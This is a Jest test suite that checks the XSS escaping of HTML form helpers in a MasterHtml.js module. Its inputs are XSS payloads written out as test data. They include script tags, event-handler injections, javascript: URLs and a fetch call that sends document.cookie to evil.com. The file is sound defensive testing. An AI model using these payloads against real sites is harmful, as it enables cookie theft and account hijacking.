// XSS Protection Tests for MasterHtml.js
const master = require('../../MasterControl');
require('../../MasterHtml');

describe('XSS Protection in Form Helpers', () => {
	let html;

	beforeEach(() => {
		// Create html instance (it's extended to master.viewList)
		html = master.viewList.html;
	});

	describe('linkTo()', () => {
		test('should escape malicious script in name', () => {
			const result = html.linkTo('<script>alert("XSS")</script>', '/safe');
			expect(result).not.toContain('<script>');
			expect(result).toContain('&lt;script&gt;');
		});

		test('should escape malicious javascript in href', () => {
			const result = html.linkTo('Click', 'javascript:alert("XSS")');
			expect(result).toContain('href="javascript');
			expect(result).not.toContain('href=javascript'); // Should be quoted
		});

		test('should escape quote injection', () => {
			const result = html.linkTo('Click', '" onmouseover="alert(\'XSS\')"');
			expect(result).toContain('&quot;');
			expect(result).not.toContain('onmouseover=');
		});
	});

	describe('imgTag()', () => {
		test('should escape XSS in alt attribute', () => {
			const result = html.imgTag('<script>alert("XSS")</script>', '/image.jpg');
			expect(result).not.toContain('<script>');
			expect(result).toContain('&lt;script&gt;');
		});

		test('should escape onerror handler', () => {
			const result = html.imgTag('test', '/image.jpg onerror=alert(1)');
			expect(result).toContain('&quot;');
			expect(result).toMatch(/src=".*onerror.*"/); // Should be quoted
		});

		test('should have proper attribute quoting', () => {
			const result = html.imgTag('test', '/image.jpg');
			expect(result).toMatch(/src="[^"]+"/);
			expect(result).toMatch(/alt="[^"]+"/);
		});
	});

	describe('textFieldTag()', () => {
		test('should escape malicious name', () => {
			const result = html.textFieldTag('<script>alert(1)</script>', {});
			expect(result).not.toContain('<script>');
			expect(result).toContain('&lt;script&gt;');
		});

		test('should escape malicious attributes', () => {
			const result = html.textFieldTag('username', {
				value: '"><script>alert(1)</script><input type="hidden'
			});
			expect(result).not.toContain('<script>');
			expect(result).toContain('&quot;&gt;&lt;script&gt;');
		});

		test('should properly quote all attributes', () => {
			const result = html.textFieldTag('test', { value: 'normal', class: 'form-control' });
			expect(result).toMatch(/name="[^"]+"/);
			expect(result).toMatch(/value="[^"]+"/);
			expect(result).toMatch(/class="[^"]+"/);
		});
	});

	describe('hiddenFieldTag()', () => {
		test('should escape malicious value', () => {
			const result = html.hiddenFieldTag('test', '" onclick="alert(\'XSS\')"', {});
			expect(result).not.toContain('onclick=');
			expect(result).toContain('&quot;');
		});

		test('should escape additional attributes', () => {
			const result = html.hiddenFieldTag('id', '123', {
				'data-foo': '"><script>alert(1)</script>'
			});
			expect(result).not.toContain('<script>');
		});
	});

	describe('textAreaTag()', () => {
		test('should escape message content', () => {
			const result = html.textAreaTag('comment', '<script>alert("XSS")</script>', {});
			expect(result).not.toContain('<script>');
			expect(result).toContain('&lt;script&gt;');
		});

		test('should escape attributes', () => {
			const result = html.textAreaTag('comment', 'safe', {
				placeholder: '"><script>alert(1)</script>'
			});
			expect(result).not.toContain('<script>');
		});
	});

	describe('submitButton()', () => {
		test('should escape button name', () => {
			const result = html.submitButton('<script>alert(1)</script>', {});
			expect(result).not.toContain('<script>');
			expect(result).toContain('&lt;script&gt;');
		});

		test('should escape attributes', () => {
			const result = html.submitButton('Submit', {
				onclick: 'alert(1)'
			});
			expect(result).toContain('onclick="alert(1)"'); // Escaped and quoted
		});
	});

	describe('emailField()', () => {
		test('should escape malicious attributes', () => {
			const result = html.emailField('email', {
				value: '"><script>alert(1)</script>'
			});
			expect(result).not.toContain('<script>');
		});
	});

	describe('numberField()', () => {
		test('should escape min/max/step values', () => {
			const result = html.numberField('age', '"><script>alert(1)</script>', '100', '1', {});
			expect(result).not.toContain('<script>');
			expect(result).toContain('&quot;&gt;&lt;script&gt;');
		});
	});

	describe('javaScriptSerializer()', () => {
		test('should escape closing script tags', () => {
			const data = { comment: '</script><script>alert("XSS")</script>' };
			const result = html.javaScriptSerializer('userData', data);

			// Should not contain unescaped </script>
			expect(result).not.toMatch(/<\/script><script>/);
			// Should contain escaped version
			expect(result).toContain('\\u003c/script\\u003e');
		});

		test('should escape < and > characters', () => {
			const data = { html: '<div>test</div>' };
			const result = html.javaScriptSerializer('config', data);

			expect(result).toContain('\\u003c');
			expect(result).toContain('\\u003e');
		});

		test('should escape variable name', () => {
			const result = html.javaScriptSerializer('<script>alert(1)</script>', { test: 'data' });
			expect(result).toContain('&lt;script&gt;');
		});
	});

	describe('Real-World Attack Scenarios', () => {
		test('should prevent stored XSS attack', () => {
			// Simulate stored XSS from database
			const userComment = '<img src=x onerror=alert(document.cookie)>';
			const result = html.textAreaTag('comment', userComment, {});

			expect(result).not.toContain('onerror=');
			expect(result).toContain('&lt;img');
		});

		test('should prevent reflected XSS attack', () => {
			// Simulate reflected XSS from URL parameter
			const searchQuery = '"><script>fetch("http://evil.com?c="+document.cookie)</script>';
			const result = html.textFieldTag('search', { value: searchQuery });

			expect(result).not.toContain('<script>');
			expect(result).not.toContain('fetch(');
		});

		test('should prevent DOM-based XSS', () => {
			const maliciousUrl = 'javascript:eval(atob("YWxlcnQoMSk="))';
			const result = html.linkTo('Click', maliciousUrl);

			// Should be quoted and escaped
			expect(result).toMatch(/href="[^"]*"/);
		});
	});
});
